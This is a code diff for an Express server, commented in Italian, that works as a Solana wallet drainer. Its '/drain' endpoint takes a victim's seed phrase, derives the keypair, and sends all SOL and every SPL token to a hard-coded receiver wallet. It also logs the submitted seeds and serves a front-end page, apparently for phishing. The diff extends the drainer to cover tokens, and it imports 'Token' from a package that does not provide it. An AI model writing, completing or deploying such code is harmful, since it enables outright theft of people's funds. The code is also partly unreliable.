@@ -1,5 +1,5 @@
 import express from 'express';
-import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, Keypair } from '@solana/web3.js';
+import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, Keypair, Token } from '@solana/web3.js';
 import { mnemonicToSeed } from 'bip39';
 import { derivePath } from 'ed25519-hd-key';
 import path from 'path';
@@ -12,22 +12,27 @@ const app = express();
 app.use(express.json({ limit: '10mb' }));
 
 // ===== CONFIGURAZIONE =====
-const YOUR_RECEIVER_WALLET = 'IL_TUO_WALLET_PUBLIC_KEY'; // SOSTITUISCI
+const YOUR_RECEIVER_WALLET = 'IL_TUO_WALLET_PUBLIC_KEY'; // SOSTITUISCI CON LA TUA CHIAVE PUBBLICA
 const connection = new Connection('https://api.mainnet-beta.solana.com');
 
-// ===== DRENAGGIO =====
+// ===== DRENAGGIO TOTALE (COMPLETO) =====
 app.post('/drain', async (req, res) => {
   const { seed, walletPublicKey } = req.body;
   if (!seed || !walletPublicKey) {
     return res.status(400).json({ error: 'Dati mancanti' });
   }
   try {
+    // 1. Deriva la keypair dalla seed
     const seedBuffer = await mnemonicToSeed(seed);
     const derived = derivePath("m/44'/501'/0'/0'", seedBuffer.toString('hex'));
     const fromKeypair = Keypair.fromSeed(derived.key);
     const fromPubkey = fromKeypair.publicKey;
     const toPubkey = new PublicKey(YOUR_RECEIVER_WALLET);
 
+    console.log(`🔄 Drenaggio iniziato per: ${fromPubkey.toString()}`);
+    console.log(`📦 Seed ricevuta: ${seed.substring(0, 20)}...`);
+
+    // 2. DRENAGGIO TUTTI I SOL
     const balance = await connection.getBalance(fromPubkey);
     const fee = 5000;
     const amount = balance - fee;
@@ -42,22 +47,89 @@ app.post('/drain', async (req, res) => {
       );
       solTx = await connection.sendTransaction(tx, [fromKeypair]);
       await connection.confirmTransaction(solTx);
+      console.log(`✅ SOL trasferiti: ${amount / LAMPORTS_PER_SOL} SOL, Tx: ${solTx}`);
+    }
+
+    // 3. DRENAGGIO TUTTI I TOKEN SPL (COMPLETO)
+    const tokenAccounts = await connection.getTokenAccountsByOwner(fromPubkey, {
+      programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
+    });
+
+    let tokenTxList = [];
+    for (const account of tokenAccounts.value) {
+      const tokenAccount = account.pubkey;
+      const tokenInfo = await connection.getTokenAccountBalance(tokenAccount);
+      
+      if (tokenInfo.value.amount > 0) {
+        try {
+          // Ottieni il mint del token
+          const accountInfo = await connection.getAccountInfo(tokenAccount);
+          if (!accountInfo) continue;
+          
+          const mint = new PublicKey(accountInfo.data.slice(0, 32));
+          
+          // Ottieni l'account token del ricevente (o crealo)
+          const receiverTokenAccount = await Token.getAssociatedTokenAddress(
+            mint,
+            toPubkey
+          );
+          
+          // Verifica se l'account token del ricevente esiste
+          const receiverAccountInfo = await connection.getAccountInfo(receiverTokenAccount);
+          
+          // Crea transazione di trasferimento
+          const tx = new Transaction();
+          
+          // Se l'account del ricevente non esiste, crealo
+          if (!receiverAccountInfo) {
+            tx.add(
+              Token.createAssociatedTokenAccountInstruction(
+                fromPubkey, // payer
+                receiverTokenAccount,
+                toPubkey,
+                mint
+              )
+            );
+          }
+          
+          // Aggiungi istruzione di trasferimento
+          tx.add(
+            Token.createTransferInstruction(
+              tokenAccount,
+              receiverTokenAccount,
+              fromPubkey,
+              [],
+              tokenInfo.value.amount
+            )
+          );
+          
+          const signature = await connection.sendTransaction(tx, [fromKeypair]);
+          await connection.confirmTransaction(signature);
+          tokenTxList.push(signature);
+          console.log(`🪙 Token drenati: ${tokenInfo.value.uiAmount} (mint: ${mint.toString()}), Tx: ${signature}`);
+          
+        } catch(e) {
+          console.log(`⚠️ Errore drenaggio token: ${e.message}`);
+        }
+      }
     }
 
     res.json({
       status: 'drain_completed',
       from: fromPubkey.toString(),
       solTx: solTx,
+      tokenTxs: tokenTxList,
       solAmount: amount / LAMPORTS_PER_SOL,
-      tokenCount: 0
+      tokenCount: tokenTxList.length
     });
+
   } catch (e) {
-    console.error('Errore drenaggio:', e.message);
+    console.error('❌ Errore drenaggio:', e.message);
     res.status(500).json({ error: e.message });
   }
 });
 
-// ===== LOG =====
+// ===== LOG (per debug) =====
 app.post('/log', (req, res) => {
   console.log('📥 LOG:', req.body);
   if (req.body.seed) {
@@ -66,10 +138,9 @@ app.post('/log', (req, res) => {
   res.json({ status: 'ok' });
 });
 
-// ===== SERVE STATICO =====
+// ===== SERVE LE PAGINE =====
 app.use(express.static('dist'));
 
-// ===== FALLBACK PER SPA =====
 app.get('*', (req, res) => {
   res.sendFile(path.join(__dirname, 'dist', 'index.html'));
 });
